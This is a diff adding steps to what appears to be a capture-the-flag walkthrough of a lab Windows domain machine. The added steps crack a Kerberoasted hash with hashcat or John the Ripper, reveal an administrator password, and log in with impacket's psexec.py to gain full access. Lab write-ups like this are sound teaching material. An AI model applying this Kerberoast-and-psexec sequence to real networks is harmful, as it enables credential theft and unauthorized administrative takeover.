@@ -26,3 +26,13 @@ Now since we do have kerberos i am going to use impacket:getusersSPN.PY and grab
 
 ![Active_hashes](https://user-images.githubusercontent.com/55708909/91635985-9484c580-ea1a-11ea-92da-70e7419d7420.png)
 
+Use hashcat or john the ripper and we have password: Ticketmaster1968
+
+Now use psexec.py 
+
+python psexec.py administrator:Ticketmaster1968@10.10.10.100
+
+And Now have desirable access.
+
+![Active_root](https://user-images.githubusercontent.com/55708909/91636044-373d4400-ea1b-11ea-9853-3625d0026720.png)
+
